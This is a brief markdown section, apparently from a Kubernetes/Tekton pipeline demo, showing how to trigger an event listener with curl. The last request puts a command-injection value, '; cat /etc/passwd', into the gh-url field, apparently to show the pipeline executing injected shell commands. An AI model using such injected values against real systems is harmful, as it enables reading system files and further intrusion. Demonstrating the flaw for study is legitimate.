## Triggering the event
```
kubectl port-forward service/el-pipeline-listener 8080
```
```
curl -v \
   -H 'content-Type: application/json' \
   -d '{"gh-url": "https://github.com/xxradar/mydemo.git"}' \
   http://localhost:8080
```


```
curl -v \
   -H 'content-Type: application/json' \
   -d '{"gh-url": "https://github.com/xxradar/mydemo.git; cat /etc/passwd"}' \
   http://localhost:8080
```
